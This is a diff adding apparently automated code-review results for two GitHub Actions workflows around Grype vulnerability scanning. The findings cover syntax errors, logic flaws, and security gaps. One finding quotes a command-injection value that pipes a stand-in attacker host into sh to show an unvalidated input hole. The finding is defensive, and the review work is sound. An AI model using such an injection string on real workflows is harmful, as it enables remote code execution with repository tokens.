@@ -1,0 +1,86 @@
+{
+ "id": "rd06",
+ "arm": "cc-review-high",
+ "findings": [
+  {
+   "source": "cc-review",
+   "file": ".github/workflows/grype-remediation-suggestions.yml",
+   "start_line": 32,
+   "end_line": 32,
+   "message": "The 'Resolve source workflow run ID' step declares the `env:` mapping twice, and GitHub Actions rejects workflow files with duplicate YAML keys. GitHub fails to parse the workflow file ('env' is already defined), so the remediation workflow never runs, whether triggered by workflow_run or workflow_dispatch."
+  },
+  {
+   "source": "cc-review",
+   "file": ".github/workflows/grype-remediation-suggestions.yml",
+   "start_line": 94,
+   "end_line": 94,
+   "message": "The shell conditional reads `if \u2026 elif \u2026 else \u2026 else \u2026 fi` with two `else` branches, which is a bash syntax error. The first `else` block looks like an older copy left behind when the same-week fallback was added. Bash parses the whole `if` compound before running any of it, so the step fails with \"syntax error near unexpected token `else'\" on every trigger, including the workflow_run path that only needs to echo the event's run id."
+  },
+  {
+   "source": "cc-review",
+   "file": ".github/workflows/grype-remediation-suggestions.yml",
+   "start_line": 162,
+   "end_line": 162,
+   "message": "The nested heredocs inside the if-block keep 2 spaces of indentation after the YAML block dedent. The `  PY` terminators therefore never close the `<<'PY'` heredoc, and the Python body would start with indented lines. After YAML strips 10 spaces, the line reads `  PY`, which does not match the delimiter `PY`. Bash reads to EOF and reports 'unexpected end of file'. Even with the terminator fixed, `python -` would hit `IndentationError: unexpected indent` on `  import datetime`."
+  },
+  {
+   "source": "cc-review",
+   "file": ".github/workflows/grype-remediation-suggestions.yml",
+   "start_line": 105,
+   "end_line": 105,
+   "message": "The manual-dispatch fallback filters runs with `branch=pre-update-release`. Scheduled runs of the weekly scan run on the default branch (main) and only check out pre-update-release internally, so their head_branch never matches. A manual dispatch without run_id gets no runs in the 7-day window or in the fallback query and exits with \"No successful runs found for workflow 'Weekly Grype Security Scan' on branch 'pre-update-release'\", even though successful weekly scans exist."
+  },
+  {
+   "source": "cc-review",
+   "file": ".github/workflows/grype-remediation-suggestions.yml",
+   "start_line": 319,
+   "end_line": 319,
+   "message": "The tracking issue is only created or updated when there are recommendations. When a later scan reports nothing fixable, the existing open issue is never updated or closed. Week 1 opens the issue listing fixable packages. Week 2's scan is clean, so has_recommendations is 'false' and the step is skipped. The issue keeps showing week 1's outdated list as if it were current."
+  },
+  {
+   "source": "cc-review",
+   "file": ".github/workflows/grype-remediation-suggestions.yml",
+   "start_line": 202,
+   "end_line": 202,
+   "message": "The artifact zip download passes the `Authorization: Bearer` header to `archive_download_url`. That URL 302-redirects to pre-signed blob storage, and urllib's redirect handler forwards the header there. The blob storage host gets both a SAS-signed URL and a Bearer Authorization header and can reject the request (400/403 AuthenticationFailed), so the artifact download step fails."
+  },
+  {
+   "source": "cc-review",
+   "file": ".github/workflows/dependabot-grype-guard.yml",
+   "start_line": 202,
+   "end_line": 202,
+   "message": "The regression gate compares only High/Critical counts, so a PR that fixes one Critical CVE and introduces a different one passes as 'no regression'. The base has CVE-A (Critical). The Dependabot bump fixes CVE-A but pulls in a package with CVE-B (Critical). Both counts are 1, so critical_regression is False and the new Critical CVE merges. Comparing sets of (vuln id, package) would catch it."
+  },
+  {
+   "source": "cc-review",
+   "file": ".github/workflows/dependabot-grype-guard.yml",
+   "start_line": 12,
+   "end_line": 12,
+   "message": "The job is gated on `github.actor == 'dependabot[bot]'`, but `github.actor` is whoever triggered the run, not the PR author. When a maintainer re-runs the check or pushes a fixup commit to a Dependabot PR, the actor is the maintainer. The guard job is skipped and reports as success, so the PR can merge without the Grype gate. Use `github.event.pull_request.user.login` instead."
+  },
+  {
+   "source": "cc-review",
+   "file": ".github/workflows/grype-remediation-suggestions.yml",
+   "start_line": 37,
+   "end_line": 37,
+   "message": "`${{ inputs.run_id }}` is interpolated directly into the shell script and then into the API URL, with no validation that it is numeric. A dispatcher who enters `1\"; curl attacker | sh; echo \"` gets arbitrary commands run with a token that has issues:write. A value that is merely malformed produces a confusing API 404. Pass it through env and check that it is numeric."
+  },
+  {
+   "source": "cc-review",
+   "file": ".github/workflows/grype-remediation-suggestions.yml",
+   "start_line": 297,
+   "end_line": 297,
+   "message": "The 'Highest severity' column falls back to 'Low' for anything that isn't Critical, High, or Medium, so Negligible and Unknown fixable vulns are shown as Low. A package whose only fixable vuln has severity 'Unknown' (common for new CVEs not yet scored) appears as 'Low' in the issue table and gets deprioritized, even though its real severity is not known."
+  }
+ ],
+ "meta": {
+  "exit": 0,
+  "seconds": 82,
+  "cost_usd": 0.4283137999999999,
+  "models": [
+   "claude-opus-5-5"
+  ],
+  "level": "high",
+  "fallback_file": 0
+ }
+}
